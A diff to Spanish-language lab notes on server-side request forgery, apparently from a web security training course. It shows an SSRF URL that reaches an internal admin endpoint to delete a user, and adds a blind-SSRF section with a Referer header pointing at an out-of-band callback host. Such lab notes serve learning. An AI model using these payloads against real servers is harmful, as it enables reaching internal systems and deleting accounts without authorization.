@@ -90,7 +90,16 @@ Usar el URL encode para esta peticion pero tambien observar que si visitas el /a
 ```
 /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
 ```
-Finalmente nos damos cuenta que se se puede y borramos el usuario
+Finalmente nos damos cuenta que se se puede y borramos el usuario.
+
+# Blind SSRF with out-of-band detection
+
+Para este lab el el SSRF se puede generar desde la header Refer de la siguiente manera :
+
+```
+Referer: https://lk9753mlgwanxord5u7ns37zhqnib7.oastify.com
+
+```
 
 Referencia
 
